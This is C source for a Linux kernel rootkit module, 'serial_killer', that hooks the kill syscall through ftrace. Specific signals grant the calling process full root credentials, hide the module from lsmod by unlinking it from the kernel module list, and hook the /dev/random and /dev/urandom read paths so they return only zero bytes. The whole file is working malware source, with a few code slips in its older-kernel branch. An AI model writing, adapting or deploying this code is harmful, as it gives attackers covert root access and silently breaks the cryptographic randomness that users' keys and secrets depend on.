#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/types.h>
#include "../utils/ftrace_helper.h"

MODULE_LICENSE("GPL");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* Global Variables */
struct cred *original_user;
short has_taken_root = 0;
short is_hidden = 0;
short is_random_active = 1;
struct list_head *previous_module;
static struct ftrace_hook hooks[];
/*-----------------*/

/* Function Prototypes */
static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage int hook_kill(const struct pt_regs *regs);
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage long hook_kill(pid_t pid, int sig);
#endif
void set_root(void);
void unset_root(void);
void show_lsmod(void);
void hide_lsmod(void);
/*----------------------*/

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("random_read", hook_random_read, &orig_random_read),
    HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
};

static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    /* Call the real random_read() file operation to set up all the structures */
    bytes_read = orig_random_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "rootkit: intercepted read to /dev/random: %d bytes\n", bytes_read);

    /* Allocate a kernel buffer that we will copy the random bytes into
     * Note that copy_from_user() returns the number of bytes that could NOT be copied
     */
    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged kbuf back to userspace
     * Note that copy_to_user() returns the number of bytes that could NOT be copied
     */
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}

static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    /* Call the real urandom_read() file operation to set up all the structures */
    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "rootkit: intercepted call to /dev/urandom: %d bytes", bytes_read);

    /* Allocate a kernel buffer that we will copy the random bytes into.
     * Note that copy_from_user() returns the number of bytes the could NOT be copied
     */
    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    /* Fill kbuf with 0x00 */
    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    /* Copy the rigged kbuf back to userspace
     * Note that copy_to_user() returns the number of bytes that could NOT be copied
     */
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}


#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int hook_kill(const struct pt_regs *regs) {

    int sig = regs->si;
    int pid = regs->di;
    int err;

    if (has_taken_root == 0) {
        original_user = prepare_creds();
    }

    switch (sig) {

         // Credentials Handler
        case 60: 
            if (pid == 1) {
                printk(KERN_INFO "serial_killer: Giving Root...\n");
                set_root();
                has_taken_root = 1;
                return 0;
            } else if (pid == 0) {
                printk(KERN_INFO "serial_killer: Resetting UID...\n");
                unset_root();
                return 0;
            }

        // Presence Handler
        case 61:
            if (pid == 0 && is_hidden == 0) {
                printk(KERN_ERR "serial_killer: Already Exposed!\n");
            } else if (pid == 0 && is_hidden == 1) {
                printk(KERN_INFO "serial_killer: Exposing myself...\n");
                show_lsmod();
                is_hidden = 0;
            } else if (pid == 1 && is_hidden == 0) {
                printk(KERN_INFO "serial_killer: Hiding myself...\n");
                hide_lsmod();
                is_hidden = 1;
            } else if (pid == 1 && is_hidden == 1) {
                printk(KERN_ERR "serial_killer: Already Hidden!\n");
            }
            return 0;
        
        // Intercept /dev/random and /dev/urandom to remove pseudo randomization
        case 62:
            if (pid == 0 && is_random_active == 0) {
                printk(KERN_ERR "serial_killer: RNG - Already Inactive!!\n");
            } else if (pid == 0 && is_random_active == 1) {
                printk(KERN_INFO "serial_killer: RNG - Deactivating...\n");
                err = fh_install_hook(&hooks[1]);
                if (err) {
                    printk(KERN_DEBUG "install hook_random_read err value: %d\n", err);
                    return err;
                }
                err = fh_install_hook(&hooks[2]);
                if (err) {
                    printk(KERN_DEBUG "install hook_urandom_read err value: %d\n", err);
                    fh_remove_hook(&hooks[1]);
                    return err;
                }
                is_random_active = 0;
            } else if (pid == 1 && is_random_active == 0) {
                printk(KERN_INFO "serial_killer: RNG - Activating...\n");
                fh_remove_hook(&hooks[1]);
                fh_remove_hook(&hooks[2]);
                is_random_active = 1;
            } else if (pid == 1 && is_random_active == 1) {
                printk(KERN_ERR "serial_killer: RNG - Already Active!");
            }

        
        default:
            return orig_kill(regs);
    }

}

#else
static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);

    if (has_taken_root == 0) {
        original_user = prepare_creds();
    }

    switch (sig) {

         // Credentials Handler
        case 60: 
            if (pid == 0) {
                printk(KERN_INFO "serial_killer: Giving Root...\n");
                set_root();
                has_taken_root = 1;
                return 0;
            } else if (pid == 1) {
                printk(KERN_INFO "serial_killer: Resetting UID...\n");
                unset_root();
                return 0;
            }

        // Presence Handler
        case 61:
            if (pid == 0 && is_hidden == 0) {
                printk(KERN_ERR "serial_killer: Already Exposed!\n");
            } else if (pid == 0 && is_hidden == 1) {
                printk(KERN_INFO "serial_killer: Exposing myself...\n");
                show_lsmod();
                is_hidden = 0;
            } else if (pid == 1 && is_hidden == 0) {
                printk(KERN_INFO "serial_killer: Hiding myself...\n");
                hide_lsmod();
                is_hidden = 1;
            } else if (pid == 1 && is_hidden == 1) {
                printk(KERN_ERR "serial_killer: Already Hidden!\n");
            }
            return 0;

        default:
            return orig_kill(regs);
    }
}
#endif

/* Sets user to root and 
return the original struct cred */
void set_root(void) {

    struct cred *user;
    user = prepare_creds();
    if (user == NULL){
        return;
    }
    /* Run through and set all the various id's to 0 (root) */
    user->uid.val = user->gid.val = 0;
    user->euid.val = user->egid.val = 0;
    user->suid.val = user->sgid.val = 0;
    user->fsuid.val = user->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(user);
}

void unset_root(void){
    // revert back to original_user cred
    commit_creds(original_user);
    return;
}

void show_lsmod(void) {
    list_add(&THIS_MODULE->list, previous_module);
    return;
}

void hide_lsmod(void) {
    previous_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    return;
}


int __init serial_killer_init(void){

    int err;
    //err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

    // install hook for sys_kill 
    err = fh_install_hook(&hooks[0]);
    if (err) {
        printk(KERN_DEBUG "err value: %d\n", err);
        return err;
    }
    printk(KERN_DEBUG "serial_killer: Loaded!\n");
    return 0;
}

void __exit serial_killer_exit(void){
    //fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    fh_remove_hook(&hooks[0]);
    if (is_random_active == 0) {
        fh_remove_hook(&hooks[1]);
        fh_remove_hook(&hooks[2]);
    }
    printk(KERN_DEBUG "serial_killer: Unloaded!\n");
}

module_init(serial_killer_init);
module_exit(serial_killer_exit);

